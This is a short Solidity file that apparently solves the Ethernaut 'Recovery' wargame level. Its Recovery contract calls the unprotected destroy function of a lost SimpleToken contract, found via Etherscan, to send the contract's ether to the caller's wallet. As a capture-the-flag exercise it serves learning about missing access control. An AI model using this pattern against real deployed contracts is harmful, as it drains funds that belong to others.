// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface SimpleToken {
  function destroy(address payable _to) external;
}

// Go to etherscan
// See the new contract created
// destroy the contract to remove the value from there
contract Recovery {
    function remove(address _lostContract, address payable _ourWallet) public {
        SimpleToken(_lostContract).destroy(_ourWallet);
    }
}
